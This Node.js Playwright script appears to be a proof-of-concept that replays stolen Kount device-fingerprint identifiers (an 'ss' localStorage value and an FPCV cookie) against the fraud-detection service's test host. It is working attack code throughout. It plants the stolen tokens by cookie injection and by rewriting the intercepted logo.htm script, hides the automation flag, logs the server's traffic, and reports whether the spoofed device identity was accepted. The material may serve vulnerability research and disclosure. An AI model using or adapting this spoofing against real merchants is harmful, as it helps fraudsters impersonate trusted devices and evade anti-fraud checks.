#!/usr/bin/env node
/** knt-spoof3.mjs — fully instrumented spoof replay: logs every kaptcha request
 *  + response status/body-head so we can show exactly what the server saw and
 *  what it did with the stolen (ss + FPCV) identity pair. */
import { chromium } from 'playwright';
import http from 'node:http';

const TST = { host: 'tst.kaptcha.com', ip: '44.240.88.212' };
const MERCHANT = '700000';
const STOLEN_SS = 'e5e65927bd2c4b02bf5d215d3a888d20';
const STOLEN_FPCV = '85c84560a8a0e45289b1bbe6a6b8b432711fa9fc467014b34f30360344148a5d1adc3f68f1109ea7f0243970fa703054681eacabed54910b6317164f4b51a7286a11639f380c87fd1d5eae67e1b6e19a99d3d58bf606013ab662fff5c65fb8b8d50457bf848b1b4d58c37216f9ff6eb9757e889b1918126fb181f02b82300dd7343cc9ff938b4062b3df745b40723636e8e01ad3ea70fdc5158ae9';

const srv = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.end(`<!doctype html><html><body>
<script src="https://${TST.host}/collect/sdk?m=${MERCHANT}"></script>
<script>
  document.cookie = 'cdn.bluesnap.${MERCHANT}.ka.ck=${STOLEN_FPCV};path=/;SameSite=None;Secure';
  new ka.ClientSDK().collectData();
</script>
</body></html>`);
});
await new Promise(r => srv.listen(0, '127.0.0.1', r));
const port = srv.address().port;

const b = await chromium.launch({
  headless: true,
  args: [`--host-resolver-rules=MAP ${TST.host} ${TST.ip}, MAP ssl.kaptcha.com 35.80.101.90, MAP kaptcha.com 35.80.101.90`,
         '--disable-blink-features=AutomationControlled'],
});
const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
const page = await ctx.newPage();

await page.route('**/logo.htm*', async (route) => {
  const resp = await route.fetch();
  let html = await resp.text();
  html = html.replace("<script type='text/javascript'>", `<script type='text/javascript'>localStorage.setItem('ss','${STOLEN_SS}');`);
  await route.fulfill({ response: resp, body: html });
});

const trail = [];
page.on('request', (req) => {
  const u = req.url();
  if (!u.includes('kaptcha.com')) return;
  trail.push({ dir: 'REQ', m: req.method(), u: u.slice(0, 150), body: req.postData() || '' });
});
page.on('response', async (res) => {
  const u = res.url();
  if (!u.includes('kaptcha.com')) return;
  let head = ''; try { const buf = await res.body(); head = buf.slice(0, 160).toString('latin1'); } catch (_) {}
  trail.push({ dir: 'RES', status: res.status(), u: u.slice(0, 150), head });
});

await page.goto(`http://127.0.0.1:${port}/`, { waitUntil: 'domcontentloaded' });
await page.waitForTimeout(28000);
try { await page.evaluate(() => window.dispatchEvent(new Event('pagehide'))); } catch (_) {}
await page.waitForTimeout(2500);

const fpcvAfter = await page.evaluate(() => {
  const m = document.cookie.match(/cdn\.[^=]+=([^;]+)/);
  return m ? m[1] : null;
}).catch(() => null);

console.log('=== KOUNT SPOOF — full server-observed trail ===');
console.log('stolen ss  :', STOLEN_SS);
console.log('stolen FPCV:', STOLEN_FPCV.slice(0, 40) + '...');
console.log('');
for (const t of trail) {
  if (t.dir === 'REQ') {
    console.log(`REQ  ${t.m} ${t.u}`);
    if (t.body) console.log(`     body: ${t.body.slice(0, 260)}${t.body.length > 260 ? '...' : ''}`);
  } else {
    console.log(`RES  ${t.status} ${t.u}`);
    if (t.head && !t.u.includes('logo.htm')) console.log(`     head: ${t.head.slice(0, 120)}`);
  }
}
console.log('');
console.log('FPCV cookie AFTER spoof run:', fpcvAfter ? fpcvAfter.slice(0, 40) + '...' : '(none)');
console.log('=> ' + (fpcvAfter === STOLEN_FPCV ? 'STOLEN VALUE HELD — server accepted the replayed device identity' : 'server reissued a fresh FPCV'));
srv.close(); await b.close();
